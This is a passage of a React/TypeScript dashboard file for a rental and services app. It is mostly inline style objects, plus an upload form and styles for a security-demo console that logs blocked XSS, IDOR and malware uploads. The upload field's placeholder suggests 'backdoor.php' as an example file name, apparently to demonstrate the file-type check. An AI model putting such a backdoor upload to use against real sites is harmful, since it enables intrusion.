              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Attach Completion Certificate or Invoice (Allowed: .pdf, .jpg, .png)</label>
                <div style={uploadContainerStyleStyle}>
                  <input 
                    type="text" 
                    placeholder="Enter file name (e.g. invoice.pdf, backdoor.php...)"
                    value={proofFileName}
                    onChange={(e) => {
                      setProofFileName(e.target.value)
                      setProofFileError(null)
                    }}
                    style={modalInputStyle}
                    required
                  />
                  {proofFileName && !proofFileError && (
                    <p style={uploadSuccessLabelStyle}><ShieldCheck size={12} style={{ marginRight: 4 }} /> Document name validated</p>
                  )}
                  {proofFileError && (
                    <p style={uploadErrorLabelStyle}><AlertTriangle size={12} style={{ marginRight: 4 }} /> {proofFileError}</p>
                  )}
                </div>
              </div>

              <button 
                type="submit" 
                className="btn-gold" 
                style={modalSubmitBtnStyle}
              >
                Validate Document & Complete Contract
              </button>
            </form>
          </motion.div>
        </div>
      )}

    </div>
  )
}

// Inline Styles
const loadingStyle: React.CSSProperties = {
  width: '100vw',
  height: '100vh',
  background: '#0d0d0d',
  color: '#D4AF37',
  display: 'flex',
  justifyContent: 'center',
  alignItems: 'center',
  fontSize: '1.2rem',
  letterSpacing: '2px'
}

const dashboardContainerStyle: React.CSSProperties = {
  background: '#0d0d0d',
  minHeight: '100vh',
  width: '100%',
  color: '#ededed',
  fontFamily: 'var(--font-body), sans-serif',
  boxSizing: 'border-box'
}

const navbarStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  padding: '1rem 2rem',
  background: 'rgba(255, 255, 255, 0.02)',
  borderBottom: '1px solid rgba(212, 175, 55, 0.1)',
  backdropFilter: 'blur(10px)'
}

const logoWrapperStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'center',
  gap: '0.8rem'
}

const logoTextStyle: React.CSSProperties = {
  fontSize: '1.3rem',
  letterSpacing: '3px',
  fontFamily: 'var(--font-heading), serif',
  color: '#D4AF37'
}

const userInfoStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'center',
  gap: '1rem'
}

const roleBadgeStyle: React.CSSProperties = {
  background: 'rgba(212, 175, 55, 0.15)',
  border: '1px solid #D4AF37',
  color: '#D4AF37',
  borderRadius: '20px',
  padding: '0.2rem 0.8rem',
  fontSize: '0.7rem',
  fontWeight: 'bold',
  letterSpacing: '1px'
}

const userNameStyle: React.CSSProperties = {
  fontSize: '0.9rem',
  fontWeight: 'bold'
}

const secConsoleToggleStyle: React.CSSProperties = {
  background: 'rgba(255, 255, 255, 0.05)',
  border: '1px solid rgba(255, 255, 255, 0.1)',
  color: '#aaa',
  borderRadius: '6px',
  padding: '0.4rem 0.8rem',
  cursor: 'pointer',
  fontSize: '0.8rem',
  display: 'flex',
  alignItems: 'center',
  gap: '6px',
  transition: 'all 0.3s ease'
}

const logoutButtonStyle: React.CSSProperties = {
  background: 'transparent',
  border: 'none',
  color: '#f43f5e',
  cursor: 'pointer',
  padding: '0.5rem',
  display: 'flex',
  alignItems: 'center'
}

const mainContentGridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: '3fr 1.5fr',
  gap: '2rem',
  padding: '2rem',
  maxWidth: '1600px',
  margin: '0 auto'
}

const workspaceColumnStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '1.5rem'
}

const sidebarColumnStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '2rem'
}

const sectionHeaderStyle: React.CSSProperties = {
  fontSize: '1.5rem',
  color: '#D4AF37',
  margin: '0 0 1rem 0'
}

const filterPanelStyle: React.CSSProperties = {
  padding: '1.5rem',
  borderRadius: '12px',
  display: 'flex',
  flexDirection: 'column',
  gap: '1rem'
}

const filterRowStyle: React.CSSProperties = {
  display: 'flex',
  gap: '1.5rem',
  alignItems: 'center'
}

const searchWrapperStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'center',
  background: 'rgba(0,0,0,0.3)',
  border: '1px solid rgba(255,255,255,0.08)',
  borderRadius: '8px',
  flex: 2,
  padding: '0.4rem'
}

const searchFieldStyle: React.CSSProperties = {
  background: 'transparent',
  border: 'none',
  color: '#fff',
  fontSize: '0.9rem',
  padding: '0.4rem 0.8rem',
  width: '100%',
  outline: 'none'
}

const filterFieldStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.3rem',
  flex: 1
}

const filterLabelStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#aaa',
  textTransform: 'uppercase'
}

const sliderStyle: React.CSSProperties = {
  width: '100%',
  accentColor: '#D4AF37',
  cursor: 'pointer'
}

const filterTogglesRowStyle: React.CSSProperties = {
  display: 'flex',
  flexWrap: 'wrap',
  gap: '1.2rem',
  alignItems: 'center'
}

const checkboxWrapperStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'center',
  gap: '0.4rem',
  cursor: 'pointer'
}

const checkboxStyle: React.CSSProperties = {
  cursor: 'pointer',
  accentColor: '#D4AF37'
}

const checkboxLabelStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#ccc',
  cursor: 'pointer'
}

const filterSelectStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.3)',
  border: '1px solid rgba(255,255,255,0.08)',
  borderRadius: '8px',
  color: '#fff',
  padding: '0.5rem',
  outline: 'none',
  fontSize: '0.8rem',
  cursor: 'pointer'
}

const gridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))',
  gap: '1.5rem',
  marginTop: '1rem'
}

const cardStyle: React.CSSProperties = {
  borderRadius: '12px',
  overflow: 'hidden',
  display: 'flex',
  flexDirection: 'column',
  transition: 'all 0.3s ease',
  border: '1px solid rgba(255,255,255,0.05)'
}

const cardImageWrapperStyle: React.CSSProperties = {
  position: 'relative',
  height: '180px',
  width: '100%',
  background: '#222'
}

const cardImageStyle: React.CSSProperties = {
  width: '100%',
  height: '100%',
  objectFit: 'cover'
}

const priceTagStyle: React.CSSProperties = {
  position: 'absolute',
  bottom: '10px',
  right: '10px',
  background: 'rgba(13, 13, 13, 0.85)',
  border: '1px solid #D4AF37',
  color: '#D4AF37',
  borderRadius: '4px',
  padding: '0.2rem 0.6rem',
  fontSize: '0.8rem',
  fontWeight: 'bold'
}

const cardBodyStyle: React.CSSProperties = {
  padding: '1.2rem',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.8rem',
  flex: 1
}

const cardTitleStyle: React.CSSProperties = {
  fontSize: '1.1rem',
  fontWeight: 'bold',
  color: '#D4AF37',
  margin: 0
}

const cardLocationStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#aaa',
  margin: 0,
  display: 'flex',
  alignItems: 'center'
}

const cardDescStyle: React.CSSProperties = {
  fontSize: '0.85rem',
  color: '#ccc',
  margin: 0,
  lineHeight: '1.4'
}

const chipsWrapperStyle: React.CSSProperties = {
  display: 'flex',
  gap: '0.5rem',
  flexWrap: 'wrap'
}

const chipStyle: React.CSSProperties = {
  background: 'rgba(255, 255, 255, 0.05)',
  borderRadius: '4px',
  padding: '0.2rem 0.5rem',
  fontSize: '0.7rem',
  color: '#bbb',
  display: 'flex',
  alignItems: 'center'
}

const requirementsBoxStyle: React.CSSProperties = {
  background: 'rgba(212, 175, 55, 0.04)',
  border: '1px solid rgba(212, 175, 55, 0.15)',
  borderRadius: '6px',
  padding: '0.6rem 0.8rem',
  marginTop: '0.5rem'
}

const reqHeaderStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#D4AF37',
  margin: '0 0 0.3rem 0',
  fontWeight: 'bold'
}

const reqListStyle: React.CSSProperties = {
  margin: 0,
  paddingLeft: '1rem',
  fontSize: '0.75rem',
  color: '#aaa',
  lineHeight: '1.4'
}

const boldLabelStyle: React.CSSProperties = {
  color: '#fff',
  fontWeight: 'bold'
}

const applyBtnStyle: React.CSSProperties = {
  width: '100%',
  padding: '0.6rem',
  fontSize: '0.85rem',
  cursor: 'pointer',
  textAlign: 'center',
  marginTop: 'auto'
}

const emptyStateStyle: React.CSSProperties = {
  gridColumn: '1/-1',
  textAlign: 'center',
  padding: '3rem 1rem',
  color: '#888',
  fontSize: '0.9rem'
}

const landlordHeaderRowStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center'
}

const requestManagerPanelStyle: React.CSSProperties = {
  padding: '1.5rem',
  borderRadius: '12px'
}

const panelTitleStyle: React.CSSProperties = {
  fontSize: '1.1rem',
  color: '#D4AF37',
  margin: '0 0 1.2rem 0',
  borderBottom: '1px solid rgba(255,255,255,0.05)',
  paddingBottom: '0.6rem'
}

const requestTableStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '1rem'
}

const reqRowStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  background: 'rgba(255, 255, 255, 0.02)',
  border: '1px solid rgba(255,255,255,0.04)',
  borderRadius: '8px',
  padding: '1rem 1.2rem',
  gap: '1.5rem'
}

const reqSummaryStyle: React.CSSProperties = {
  flex: 1
}

const reqTitleStyle: React.CSSProperties = {
  fontSize: '0.95rem',
  fontWeight: 'bold',
  color: '#fff',
  margin: '0 0 0.2rem 0'
}

const reqSubTitleStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#D4AF37',
  margin: '0 0 0.5rem 0'
}

const reqMsgStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#ccc',
  fontStyle: 'italic',
  margin: 0
}

const reqActionsStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  alignItems: 'flex-end',
  gap: '0.8rem'
}

const verifyBtnStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  padding: '0.4rem 0.8rem',
  display: 'flex',
  alignItems: 'center'
}

const tenantRequestsPanelStyle: React.CSSProperties = {
  padding: '1.2rem',
  borderRadius: '12px'
}

const tenantReqListStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.8rem'
}

const tenantReqCardStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.2)',
  border: '1px solid rgba(255,255,255,0.04)',
  borderRadius: '8px',
  padding: '0.8rem 1rem',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.4rem'
}

const tenantReqTitleStyle: React.CSSProperties = {
  fontSize: '0.85rem',
  fontWeight: 'bold',
  color: '#fff',
  margin: 0
}

const tenantReqDateStyle: React.CSSProperties = {
  fontSize: '0.7rem',
  color: '#777',
  margin: 0
}

const tenantReqFooterStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'flex-end',
  marginTop: '0.3rem'
}

const badgeStyleStyle = (status: string): React.CSSProperties => {
  const isApproved = status === 'approved'
  const isPending = status === 'pending'
  return {
    fontSize: '0.65rem',
    fontWeight: 'bold',
    borderRadius: '4px',
    padding: '0.15rem 0.4rem',
    background: isApproved ? 'rgba(34, 197, 94, 0.15)' : isPending ? 'rgba(234, 179, 8, 0.15)' : 'rgba(239, 68, 68, 0.15)',
    border: `1px solid ${isApproved ? '#22c55e' : isPending ? '#eab308' : '#ef4444'}`,
    color: isApproved ? '#22c55e' : isPending ? '#eab308' : '#ef4444',
    letterSpacing: '0.5px'
  }
}

const consolePanelStyle: React.CSSProperties = {
  padding: '1.5rem',
  borderRadius: '12px',
  border: '1px solid rgba(239, 68, 68, 0.25)',
  background: 'rgba(10, 10, 10, 0.95)'
}

const consoleHeaderStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  marginBottom: '0.8rem',
  borderBottom: '1px solid rgba(239, 68, 68, 0.15)',
  paddingBottom: '0.6rem'
}

const consoleTitleWrapperStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'center',
  gap: '6px',
  fontWeight: 'bold',
  fontSize: '0.85rem',
  color: '#ef4444'
}

const consolePulseStyle: React.CSSProperties = {
  width: '8px',
  height: '8px',
  borderRadius: '50%',
  background: '#ef4444',
  boxShadow: '0 0 10px #ef4444'
}

const consoleDescStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#aaa',
  margin: '0 0 1rem 0',
  lineHeight: '1.4'
}

const hackButtonsRowStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.5rem',
  marginBottom: '1rem'
}

const hackBtnStyle: React.CSSProperties = {
  background: 'rgba(239, 68, 68, 0.1)',
  border: '1px solid rgba(239, 68, 68, 0.3)',
  color: '#fff',
  borderRadius: '4px',
  padding: '0.5rem',
  fontSize: '0.75rem',
  fontFamily: 'monospace',
  cursor: 'pointer',
  textAlign: 'left',
  transition: 'all 0.2s ease'
}

const consoleInputStyle: React.CSSProperties = {
  background: '#000',
  border: '1px solid rgba(255,255,255,0.1)',
  borderRadius: '4px',
  padding: '0.5rem',
  color: '#39ff14',
  fontFamily: 'monospace',
  fontSize: '0.8rem',
  outline: 'none',
  width: '100%',
  boxSizing: 'border-box'
}

const feedbackBoxStyleStyle = (type: 'success' | 'warning' | 'error'): React.CSSProperties => {
  const isErr = type === 'error'
  const isWarn = type === 'warning'
  return {
    background: isErr ? 'rgba(239, 68, 68, 0.1)' : isWarn ? 'rgba(234, 179, 8, 0.1)' : 'rgba(34, 197, 94, 0.1)',
    border: `1px solid ${isErr ? '#ef4444' : isWarn ? '#eab308' : '#22c55e'}`,
    borderRadius: '4px',
    padding: '0.8rem',
    marginTop: '1rem',
    color: '#fff',
    fontSize: '0.75rem',
    lineHeight: '1.4',
    display: 'flex',
    alignItems: 'flex-start'
  }
}

const logConsoleStyle: React.CSSProperties = {
  marginTop: '1.5rem',
  borderTop: '1px dashed rgba(255,255,255,0.1)',
  paddingTop: '1rem'
}

const logTitleStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  fontWeight: 'bold',
  color: '#D4AF37',
  margin: '0 0 0.5rem 0'
}

const logScrollAreaStyle: React.CSSProperties = {
  height: '140px',
  background: '#050505',
  border: '1px solid rgba(255,255,255,0.05)',
  borderRadius: '4px',
  padding: '0.6rem',
  overflowY: 'auto',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.4rem',
  fontFamily: 'monospace',
  fontSize: '0.65rem',
  boxSizing: 'border-box'
}

const logLineStyleStyle = (type: string): React.CSSProperties => {
  const isXss = type === 'xss_blocked'
  const isIdor = type === 'idor_prevented'
  const isLimit = type === 'rate_limit_triggered'
  const isMal = type === 'upload_malware_blocked'
  const color = isXss ? '#f43f5e' : isIdor ? '#fbbf24' : isLimit ? '#f87171' : isMal ? '#ec4899' : '#34d399'
  return {
    color,
    lineHeight: '1.3'
  }
}

const logTimeStyle: React.CSSProperties = {
  color: '#666',
  marginRight: '4px'
}

const logTypeLabelStyle: React.CSSProperties = {
  fontWeight: 'bold',
  marginRight: '6px'
}

const logEmptyStyle: React.CSSProperties = {
  color: '#555',
  textAlign: 'center',
  padding: '2rem 0'
}

const infoBoxStyle: React.CSSProperties = {
  padding: '1rem 1.2rem',
  borderRadius: '12px'
}

const infoBoxTitleStyle: React.CSSProperties = {
  fontSize: '0.85rem',
  color: '#D4AF37',
  margin: '0 0 0.4rem 0',
  display: 'flex',
  alignItems: 'center'
}

const infoBoxDescStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#888',
  margin: 0,
  lineHeight: '1.4'
}

// Modals
const modalBackdropStyle: React.CSSProperties = {
  position: 'fixed',
  top: 0,
  left: 0,
  right: 0,
  bottom: 0,
  background: 'rgba(0, 0, 0, 0.8)',
  backdropFilter: 'blur(4px)',
  display: 'flex',
  justifyContent: 'center',
  alignItems: 'center',
  zIndex: 1000,
  padding: '1rem'
}

const modalPanelStyle: React.CSSProperties = {
  width: '100%',
  maxWidth: '600px',
  borderRadius: '16px',
  padding: '2rem',
  boxShadow: '0 10px 40px rgba(0,0,0,0.9)',
  border: '1px solid rgba(212,175,55,0.2)',
  boxSizing: 'border-box'
}

const verifyModalPanelStyle: React.CSSProperties = {
  width: '100%',
  maxWidth: '560px',
  borderRadius: '16px',
  padding: '2rem',
  boxShadow: '0 10px 40px rgba(0,0,0,0.9)',
  border: '1px solid rgba(212,175,55,0.2)',
  boxSizing: 'border-box'
}

const modalHeaderStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  marginBottom: '1.5rem',
  borderBottom: '1px solid rgba(255,255,255,0.05)',
  paddingBottom: '0.6rem'
}

const closeBtnStyle: React.CSSProperties = {
  background: 'transparent',
  border: 'none',
  color: '#888',
  cursor: 'pointer'
}

const formStyleStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '1rem'
}

const rowStyleStyle: React.CSSProperties = {
  display: 'flex',
  gap: '1rem'
}

const modalInputStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.4)',
  border: '1px solid rgba(255,255,255,0.08)',
  borderRadius: '6px',
  padding: '0.6rem 0.8rem',
  color: '#fff',
  fontSize: '0.85rem',
  outline: 'none',
  width: '100%',
  boxSizing: 'border-box'
}

const modalTextareaStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.4)',
  border: '1px solid rgba(255,255,255,0.08)',
  borderRadius: '6px',
  padding: '0.6rem 0.8rem',
  color: '#fff',
  fontSize: '0.85rem',
  outline: 'none',
  width: '100%',
  boxSizing: 'border-box',
  resize: 'none'
}

const modalSelectStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.4)',
  border: '1px solid rgba(255,255,255,0.08)',
  borderRadius: '6px',
  padding: '0.6rem 0.8rem',
  color: '#fff',
  fontSize: '0.85rem',
  outline: 'none',
  width: '100%',
  boxSizing: 'border-box',
  cursor: 'pointer'
}

const checkboxGridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: 'repeat(3, 1fr)',
  gap: '0.5rem',
  marginTop: '0.5rem'
}

const modalSubmitBtnStyle: React.CSSProperties = {
  padding: '0.8rem',
  fontSize: '0.9rem',
  fontWeight: 'bold',
  letterSpacing: '2px',
  width: '100%',
  marginTop: '0.5rem'
}

const applySummaryBoxStyle: React.CSSProperties = {
  background: 'rgba(212,175,55,0.04)',
  border: '1px solid rgba(212,175,55,0.15)',
  borderRadius: '8px',
  padding: '1rem',
  marginBottom: '1rem'
}

const applySummaryTitleStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#D4AF37',
  margin: '0 0 0.5rem 0',
  fontWeight: 'bold'
}

const profileSummaryGridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: 'repeat(4, 1fr)',
  gap: '0.5rem',
  fontSize: '0.75rem',
  color: '#aaa',
  margin: 0
}

const boldValueStyle: React.CSSProperties = {
  color: '#fff',
  fontWeight: 'bold'
}

// Verification Modal Elements
const verifyContentStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '1.2rem'
}

const verifyCardStyle: React.CSSProperties = {
  background: 'rgba(255, 255, 255, 0.02)',
  border: '1px solid rgba(255,255,255,0.04)',
  borderRadius: '8px',
  padding: '1rem'
}

const verifyTitleStyle: React.CSSProperties = {
  fontSize: '0.85rem',
  color: '#D4AF37',
  margin: '0 0 0.6rem 0',
  display: 'flex',
  alignItems: 'center'
}

const verifyBioStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#ccc',
  fontStyle: 'italic',
  margin: '0 0 1rem 0'
}

const verifyGridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: 'repeat(4, 1fr)',
  gap: '0.8rem'
}

const verifyDetailStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.2rem',
  fontSize: '0.75rem',
  color: '#888'
}

const verifyChecklistStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.2)',
  border: '1px solid rgba(255,255,255,0.04)',
  borderRadius: '8px',
  padding: '1rem',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.8rem'
}

const checkRowStyle: React.CSSProperties = {
  display: 'flex',
  alignItems: 'flex-start',
  gap: '0.8rem'
}

const checkTextStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#ccc',
  lineHeight: '1.4',
  flex: 1
}

const applyMsgBoxStyle: React.CSSProperties = {
  background: 'rgba(0,0,0,0.3)',
  borderRadius: '6px',
  padding: '0.8rem',
  fontSize: '0.8rem',
  borderLeft: '3px solid #D4AF37'
}

const applyMsgHeaderStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#777',
  margin: '0 0 0.3rem 0'
}

const applyMsgTextStyle: React.CSSProperties = {
  color: '#ddd',
  margin: 0,
  fontStyle: 'italic'
}

const verifyActionsRowStyle: React.CSSProperties = {
  display: 'flex',
  gap: '1rem',
  marginTop: '0.5rem'
}

const approveBtnStyle: React.CSSProperties = {
  flex: 1,
  background: '#22c55e',
  border: '1px solid #22c55e',
  color: '#fff',
  padding: '0.75rem',
  borderRadius: '6px',
  fontWeight: 'bold',
  cursor: 'pointer',
  display: 'flex',
  justifyContent: 'center',
  alignItems: 'center',
  fontSize: '0.85rem'
}

const rejectBtnStyle: React.CSSProperties = {
  flex: 1,
  background: 'transparent',
  border: '1px solid #ef4444',
  color: '#ef4444',
  padding: '0.75rem',
  borderRadius: '6px',
  fontWeight: 'bold',
  cursor: 'pointer',
  display: 'flex',
  justifyContent: 'center',
  alignItems: 'center',
  fontSize: '0.85rem'
}

const labelStyleStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#888',
  textTransform: 'uppercase'
}

const inputGroupStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.4rem',
  flex: 1
}

// B2B & P2P Custom Styling declarations
const tabHeaderContainerStyle: React.CSSProperties = {
  display: 'flex',
  borderBottom: '1px solid rgba(255,255,255,0.06)',
  gap: '10px',
  marginBottom: '1rem'
}

const activeTabBtnStyle: React.CSSProperties = {
  background: 'rgba(212,175,55,0.08)',
  borderTop: 'none',
  borderLeft: 'none',
  borderRight: 'none',
  borderBottom: '2px solid #D4AF37',
  color: '#D4AF37',
  padding: '0.6rem 1.2rem',
  fontFamily: 'var(--font-body)',
  fontSize: '0.85rem',
  fontWeight: 'bold',
  cursor: 'pointer',
  display: 'flex',
  alignItems: 'center'
}

const inactiveTabBtnStyle: React.CSSProperties = {
  background: 'transparent',
  borderTop: 'none',
  borderLeft: 'none',
  borderRight: 'none',
  borderBottom: '2px solid transparent',
  color: '#888',
  padding: '0.6rem 1.2rem',
  fontFamily: 'var(--font-body)',
  fontSize: '0.85rem',
  cursor: 'pointer',
  display: 'flex',
  alignItems: 'center',
  transition: 'color 0.2s ease'
}

const roommateTitleRowStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  width: '100%'
}

const priceTagLabelStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  fontWeight: 'bold',
  color: '#D4AF37',
  background: 'rgba(212,175,55,0.08)',
  padding: '0.2rem 0.6rem',
  borderRadius: '4px',
  border: '1px solid rgba(212,175,55,0.15)'
}

const liftClubContainerStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '1rem',
  marginTop: '1rem'
}

const liftRowCardStyle: React.CSSProperties = {
  padding: '1.2rem 1.5rem',
  borderRadius: '12px',
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  gap: '1.5rem'
}

const liftDetailsColStyle: React.CSSProperties = {
  flex: 1,
  display: 'flex',
  flexDirection: 'column',
  gap: '0.6rem'
}

const liftHeaderStyle: React.CSSProperties = {
  display: 'flex',
  justifyContent: 'space-between',
  alignItems: 'center',
  width: '100%'
}

const liftDriverTitleStyle: React.CSSProperties = {
  fontSize: '1rem',
  fontWeight: 'bold',
  color: '#fff',
  margin: 0
}

const liftPriceBadgeStyle: React.CSSProperties = {
  color: '#D4AF37',
  fontWeight: 'bold',
  fontSize: '0.85rem'
}

const liftRouteStyle: React.CSSProperties = {
  fontSize: '0.85rem',
  color: '#ccc',
  margin: 0,
  display: 'flex',
  alignItems: 'center'
}

const liftTimeBlockStyle: React.CSSProperties = {
  display: 'flex',
  gap: '0.8rem',
  flexWrap: 'wrap'
}

const liftBadgeStyle: React.CSSProperties = {
  background: 'rgba(255,255,255,0.03)',
  border: '1px solid rgba(255,255,255,0.06)',
  borderRadius: '4px',
  padding: '0.2rem 0.5rem',
  fontSize: '0.75rem',
  color: '#aaa',
  display: 'flex',
  alignItems: 'center'
}

const liftBookBtnStyle: React.CSSProperties = {
  padding: '0.6rem 1.5rem',
  fontSize: '0.8rem',
  fontWeight: 'bold',
  cursor: 'pointer'
}

const serviceRatingBadgeStyle: React.CSSProperties = {
  background: 'rgba(234,179,8,0.1)',
  border: '1px solid rgba(234,179,8,0.2)',
  color: '#fbbf24',
  borderRadius: '4px',
  padding: '0.15rem 0.4rem',
  fontSize: '0.75rem',
  display: 'flex',
  alignItems: 'center'
}

const servicePriceEstimateStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#ccc',
  margin: '0.2rem 0 0 0'
}

const topAlertBannerStyle: React.CSSProperties = {
  position: 'fixed',
  top: '20px',
  left: '50%',
  transform: 'translateX(-50%)',
  background: 'rgba(13, 13, 13, 0.95)',
  border: '1px solid #D4AF37',
  borderRadius: '8px',
  padding: '1rem 1.5rem',
  color: '#fff',
  display: 'flex',
  alignItems: 'center',
  gap: '0.8rem',
  zIndex: 2000,
  fontSize: '0.85rem',
  boxShadow: '0 4px 30px rgba(0,0,0,0.6)',
  width: '90%',
  maxWidth: '540px'
}

const p2pDescStyle: React.CSSProperties = {
  fontSize: '0.8rem',
  color: '#aaa',
  margin: 0,
  lineHeight: '1.4'
}

// New Security Sandbox Styling declarations
const playgroundGroupStyle: React.CSSProperties = {
  marginTop: '1.2rem',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.4rem',
  background: 'rgba(255,255,255,0.01)',
  border: '1px solid rgba(255,255,255,0.05)',
  borderRadius: '6px',
  padding: '0.8rem'
}

const consoleTextareaStyle: React.CSSProperties = {
  background: '#000',
  border: '1px solid rgba(255,255,255,0.1)',
  borderRadius: '4px',
  padding: '0.5rem',
  color: '#39ff14',
  fontFamily: 'monospace',
  fontSize: '0.8rem',
  outline: 'none',
  width: '100%',
  resize: 'none',
  boxSizing: 'border-box'
}

const sanitizationOutputBoxStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.2rem',
  background: 'rgba(212,175,55,0.04)',
  border: '1px dashed rgba(212,175,55,0.2)',
  borderRadius: '4px',
  padding: '0.6rem',
  marginTop: '0.4rem'
}

const sanLabelStyle: React.CSSProperties = {
  fontSize: '0.7rem',
  color: '#D4AF37',
  textTransform: 'uppercase'
}

const sanValueStyle: React.CSSProperties = {
  color: '#fff',
  fontSize: '0.75rem',
  fontFamily: 'monospace',
  wordBreak: 'break-all'
}

const uploadContainerStyleStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.4rem',
  background: 'rgba(0,0,0,0.2)',
  border: '1px dashed rgba(255,255,255,0.1)',
  borderRadius: '6px',
  padding: '0.8rem'
}

const uploadSuccessLabelStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#22c55e',
  margin: '0.2rem 0 0 0',
  display: 'flex',
  alignItems: 'center',
  fontWeight: 'bold'
}

const uploadErrorLabelStyle: React.CSSProperties = {
  fontSize: '0.75rem',
  color: '#ef4444',
  margin: '0.2rem 0 0 0',
  display: 'flex',
  alignItems: 'center',
  fontWeight: 'bold'
}

const guestBannerStyle: React.CSSProperties = {
  background: 'rgba(212, 175, 55, 0.1)',
  border: '1px dashed rgba(212, 175, 55, 0.3)',
  borderRadius: '8px',
  padding: '1rem',
  marginBottom: '1.5rem',
  display: 'flex',
  alignItems: 'center',
  color: '#e5e7eb',
  fontSize: '0.9rem',
}

const guestRegisterLinkStyle: React.CSSProperties = {
  background: 'none',
  border: 'none',
  color: '#D4AF37',
  textDecoration: 'underline',
  cursor: 'pointer',
  padding: 0,
  fontWeight: 'bold',
}

const bizWebLinkStyle: React.CSSProperties = {
  color: '#D4AF37',
  textDecoration: 'underline',
  fontSize: '0.8rem',
  display: 'inline-flex',
  alignItems: 'center',
  gap: '4px',
  marginTop: '0.5rem',
  cursor: 'pointer'
}

const walletBalanceDisplayStyle: React.CSSProperties = {
  background: 'rgba(212, 175, 55, 0.06)',
  border: '1px solid rgba(212, 175, 55, 0.15)',
  borderRadius: '8px',
  padding: '0.6rem 1rem',
  textAlign: 'right'
}

const wafContainerStyle: React.CSSProperties = {
  background: 'rgba(0, 0, 0, 0.4)',
  border: '1px solid rgba(255, 255, 255, 0.06)',
  borderRadius: '8px',
  padding: '1rem',
  marginBottom: '1rem',
  display: 'flex',
  flexDirection: 'column',
  gap: '0.8rem'
}

const wafFlowContainerStyle: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  gap: '0.8rem'
}

const wafVisualFlowStyle: React.CSSProperties = {
  position: 'relative',
  height: '24px',
  background: 'rgba(255, 255, 255, 0.02)',
  borderRadius: '4px',
  overflow: 'hidden',
  display: 'flex',
  alignItems: 'center',
  padding: '0 10px'
}

const wafPacketStyle: React.CSSProperties = {
  width: '10px',
  height: '10px',
  borderRadius: '50%',
  zIndex: 2
}

const wafLineStyle: React.CSSProperties = {
  position: 'absolute',
  top: '50%',
  left: 0,
  right: 0,
  height: '2px',
  background: 'linear-gradient(90deg, rgba(34,197,94,0.3) 0%, rgba(239,68,68,0.3) 100%)',
  transform: 'translateY(-50%)',
  zIndex: 1
}

const wafStatusGridStyle: React.CSSProperties = {
  display: 'grid',
  gridTemplateColumns: 'repeat(2, 1fr)',
  gap: '0.5rem'
}

const wafNodeStyle: React.CSSProperties = {
